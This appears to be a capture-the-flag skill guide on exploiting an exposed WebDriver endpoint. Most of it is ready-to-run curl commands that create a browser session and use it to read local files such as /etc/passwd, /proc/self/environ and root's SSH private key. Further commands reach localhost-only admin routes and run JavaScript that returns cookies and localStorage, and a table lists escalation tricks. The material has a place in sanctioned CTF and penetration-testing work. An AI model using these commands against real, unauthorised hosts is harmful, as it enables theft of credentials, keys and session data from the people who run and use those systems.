# Attack surface — when the WebDriver endpoint is the target

## The capability

An exposed WebDriver endpoint is a remote browser you can drive. The
commands are the same as the debugging use — but pointed at the
challenge, the useful ones are:

- `navigate` to any URL the browser process can reach
- `source` to read what it loaded
- `execute/sync` to run JavaScript inside it
- `screenshot` to capture what it renders

The browser runs as whatever user launched the driver — frequently
root inside a challenge container — and it can reach `file://`,
`http://localhost/`, internal services, and the app's own origin.

## The file-read primitive

```bash
curl -s -X POST http://TARGET:9515/session \
  -H 'Content-Type: application/json' \
  -d '{"capabilities":{"alwaysMatch":{"browserName":"chrome"}}}'
# -> sessionId

curl -s -X POST http://TARGET:9515/session/$S/url \
  -H 'Content-Type: application/json' \
  -d '{"url":"file:///etc/passwd"}'

curl -s http://TARGET:9515/session/$S/source
# -> the file's contents inside <html>...<body>
```

The page source wraps the file in an HTML document — parse the text
out of it. Common reads:

```
file:///etc/passwd                 # users, root shell
file:///flag / file:///flag.txt    # the flag, direct
file:///app/flag / /flag.txt       # app-relative flag
file:///proc/self/environ          # env vars — secrets, paths
file:///root/.ssh/id_rsa           # keys, when the driver runs as root
file:///app/source.py              # the app's own source
```

## Escalations past a bare file read

| Primitive | What it adds |
|---|---|
| `execute/sync` `fetch("file:///...")` | read when `file://` navigation is blocked but JS `file://` fetch is allowed |
| `execute/sync` `fetch("http://localhost:PORT")` | reach internal services behind the browser |
| `screenshot` | read a file rendered as an image when text source is mangled |
| navigate to `http://internal-admin/` | the browser's origin reaches loopback-only routes |
| a file-upload + `file://` to your uploaded file | place a file, then read it back |

## Reaching the app's own origin

The driver runs on the challenge host — its `http://localhost/` IS the
app's loopback. Routes the app only serves locally (admin panels,
debug endpoints, internal APIs) become reachable:

```bash
curl -s -X POST http://TARGET:9515/session/$S/url \
  -d '{"url":"http://localhost/admin"}'
curl -s http://TARGET:9515/session/$S/source
```

## JavaScript inside the browser

`execute/sync` runs in the page's context — origin, cookies, storage:

```bash
curl -s -X POST http://TARGET:9515/session/$S/execute/sync \
  -d '{"script":"return document.cookie","args":[]}'
curl -s -X POST http://TARGET:9515/session/$S/execute/sync \
  -d '{"script":"return localStorage.getItem(\"flag\")","args":[]}'
```

## The capability-vs-debugging distinction

The SAME endpoint is a debugging aid when you run it locally and an
attack surface when the challenge runs it. The tell is *who owns the
driver*: yours is a test harness, theirs is a foothold. Both use the
identical command set — the skill's API reference is shared.

## Falsifier

The exposed-endpoint class is dead when:

- `POST /session` is refused or returns an auth error
- the session creates but `file://` navigation is blocked by config
- `execute` returns a permissions error

A refused session is not a payload problem — the endpoint is not
exposed. Pivot to `../file-read-primitives/` or `../web-ssrf/` for the
file-read goal.

## Blast radius

A WebDriver endpoint on a shared instance is a real browser on a real
host. A leaked session holds the process open; a `file://` crawl over
`/proc` or a screenshot loop is load. Keep sessions cleaned up, reads
bounded, and do not run a directory walk through `file://` — read the
specific paths that prove the flag path exists.
